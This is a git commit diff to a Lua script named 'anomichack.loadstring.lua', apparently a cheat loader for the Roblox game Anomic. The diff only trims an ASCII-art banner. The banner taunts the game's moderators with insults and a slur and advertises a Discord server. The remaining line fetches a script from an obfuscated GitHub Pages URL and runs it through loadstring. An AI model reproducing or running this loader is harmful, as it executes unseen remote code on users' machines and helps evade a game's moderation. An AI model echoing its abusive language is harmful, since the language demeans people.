640afd444e0eb15c8c8ed02af50897972a69e604
luascrip <81441615+luascrip@users.noreply.github.com>
2021-04-08 15:18:34 +0200

    Update anomichack.loadstring.lua

--- anomichack.loadstring.lua
+++ anomichack.loadstring.lua
@@ -1,13 +1,7 @@
---[[NOV 12 2020
- ▄████▄   ██░ ██  ██▓ ██▓     ██▓     ██▓ ███▄    █     ▄▄▄       ██ ▄█▀▄▄▄          ███▄ ▄███▓ ▄▄▄       ▄████▄  
-▒██▀ ▀█  ▓██░ ██▒▓██▒▓██▒    ▓██▒    ▓██▒ ██ ▀█   █    ▒████▄     ██▄█▒▒████▄       ▓██▒▀█▀ ██▒▒████▄    ▒██▀ ▀█  
-▒▓█    ▄ ▒██▀▀██░▒██▒▒██░    ▒██░    ▒██▒▓██  ▀█ ██▒   ▒██  ▀█▄  ▓███▄░▒██  ▀█▄     ▓██    ▓██░▒██  ▀█▄  ▒▓█    ▄ 
-▒▓▓▄ ▄██▒░▓█ ░██ ░██░▒██░    ▒██░    ░██░▓██▒  ▐▌██▒   ░██▄▄▄▄██ ▓██ █▄░██▄▄▄▄██    ▒██    ▒██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒ [fuck you anomic mods]
-▒ ▓███▀ ░░▓█▒░██▓░██░░██████▒░██████▒░██░▒██░   ▓██░    ▓█   ▓██▒▒██▒ █▄▓█   ▓██▒   ▒██▒   ░██▒ ▓█   ▓██▒▒ ▓███▀ ░https://discord.gg/8gt6mqr
-░ ░▒ ▒  ░ ▒ ░░▒░▒░▓  ░ ▒░▓  ░░ ▒░▓  ░░▓  ░ ▒░   ▒ ▒     ▒▒   ▓▒█░▒ ▒▒ ▓▒▒▒   ▓▒█░   ░ ▒░   ░  ░ ▒▒   ▓▒█░░ ░▒ ▒  ░GOOD LUCK PATCHING IT RETARDS
-  ░  ▒    ▒ ░▒░ ░ ▒ ░░ ░ ▒  ░░ ░ ▒  ░ ▒ ░░ ░░   ░ ▒░     ▒   ▒▒ ░░ ░▒ ▒░ ▒   ▒▒ ░   ░  ░      ░  ▒   ▒▒ ░  ░  ▒   
-░         ░  ░░ ░ ▒ ░  ░ ░     ░ ░    ▒ ░   ░   ░ ░      ░   ▒   ░ ░░ ░  ░   ▒      ░      ░     ░   ▒   ░        
-░ ░       ░  ░  ░ ░      ░  ░    ░  ░ ░           ░          ░  ░░  ░        ░  ░          ░         ░  ░░ ░      
-░                                                                                                        ░        
+--[[
+      NOV 12 2020
+ [fuck you anomic mods]
+ https://discord.gg/8gt6mqr
+ GOOD LUCK PATCHING IT RETARDS
 ]]
 loadstring(game:HttpGet(('https://luascrip.github.io/gdsygvfasdtasgdygayudgasudgsausagydigsyudgsaidgsacvgavcyasgvcvastycvsaygcvyasvcvasycvasgcfvsafyc/anomichack.asdoijdiashduoasydashg8ya7dfa8sytfasgfsgf67ast97tfastyftastfatyfgasyf7asgfgtfyvgsdvdsauydhsadyasudgasdasydasgyfasugfsagfagfyasf.lua'),true))()
